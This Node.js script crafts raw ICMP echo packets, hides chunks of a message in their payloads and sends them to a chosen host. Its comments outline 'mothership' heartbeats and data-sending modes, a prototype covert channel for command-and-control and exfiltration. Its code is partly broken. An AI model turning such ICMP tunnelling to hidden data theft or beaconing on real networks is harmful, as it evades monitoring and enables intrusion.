//Dependancies
var raw = require ("raw-socket"); // Required to craft packets
var crypto = require('crypto'); //Used as RNG



//Declarations
var MTU = 64; // Maximum transmission size for packet. Apparently this is including header, so 56 databytes.
var ICMPHeaderSize = 8;
//Grab commandline arguments
var target= process.argv[2];
var message = process.argv[3];


/**
	Set-Up Activities.
**/

//Creating the socket that will be used to send the packets.
var options = {
	protocol: raw.Protocol.ICMP
};
var socket = raw.createSocket (options);
var socketLevel = raw.SocketLevel.IPPROTO_IP
var socketOption = raw.SocketOption.IP_TTL;



/** Helper Functions 
	These are where most of the functions will go to use promises and make things look better. CHEEUH.
**/

function decomposeMessage(message,MTU){
	return new Promise(function(resolve,reject){
		var regexp = new RegExp(".{1,"+MTU+"}","g")
		var messageArray = message.match(regexp);
		console.log(messageArray);
		console.log("resolving~!");
		resolve(messageArray);
	})
}

function forgePacket(messageArray){
	var packetArray = new Array();
	return new Promise(function(resolve,reject){

		console.log("Inside forgepacket!");
		//For each element in the messageArray (the packet), stuff it into a buffer
			for (var i = 0; i < messageArray.length; i++) {
			//Find out how much room we have to stuff in data after the header
			var ICMPpacket = new Buffer(MTU);
			ICMPpacket.write('0800000000010a09',0,ICMPHeaderSize,'hex');
			//console.log("Header has been written, buffer now: \n " + ICMPpacket.toString('hex'));
			var lengthRemaining = MTU - ICMPpacket.length;
			//Stuff data into packet
			ICMPpacket.write(messageArray[i],ICMPHeaderSize,messageArray[i].length,'ascii');
			//console.log("Message has been written, buffer now: \n " + ICMPpacket.toString('hex'))
				
				//If there's extra space
				var space = MTU - messageArray[i].length;
				if(space > 0){
					//console.log("There's still space remaining, specifically: " + space + " bytes");
					
					//generate random number to to use as padding
					var padding = crypto.randomBytes(Math.ceil(178/2))
					        .toString('ascii') // convert to hexadecimal format
					        .slice(0,89);

					var withoutPadding = ICMPHeaderSize + messageArray[i].length;
					ICMPpacket.write(padding,withoutPadding,space,'ascii');
				}
				//generate checksum
				raw.writeChecksum (ICMPpacket, 2, raw.createChecksum (ICMPpacket));
				//packet is ready to be added to array.
				packetArray.push(ICMPpacket);
			};
		//after all packets are ready, send them to next method to send
		resolve(packetArray);
	})
}

function beforeSend () {
    socket.setOption (socketLevel, socketOption, 58);
}

function afterSend (error, bytes) {
    if (error)
        console.log (error.toString ());
    else
        console.log ("sent " + bytes + " bytes");
    
    socket.setOption (socketLevel, socketOption, 1);
}

function sendPackets(packetArray){
	return new Promise(function(resolve,reject){
		console.log("Inside sending packets!")
		for (var i = 0; i < packetArray.length; i++) {
			
			socket.send (packetArray[i], 0, packetArray[i].length, target, beforeSend, afterSend, function (error, bytes) {
				if (error) {
					console.log (error.toString ());
				} else {
					console.log ("sent " + bytes + " bytes to " + target);
				}
			});
		};
	})
	console.log("Finished sending");
}
/**
Mode 1: Heartbeats.
Server sends out heartbeats to mothership to see what the instructions are.
**/

/**
Mode 2: Time to send data.
**/
var length = message.length + 1;
console.log("Message Length:  " + length);

//Check if message length is < MTU
decomposeMessage(message,MTU)
.then(forgePacket)
.then(sendPackets)
.catch(
	function(reason){
		console.log("ERROR: " + reason);
	}

);

/**
Mode 3: Receiving Data?
**/



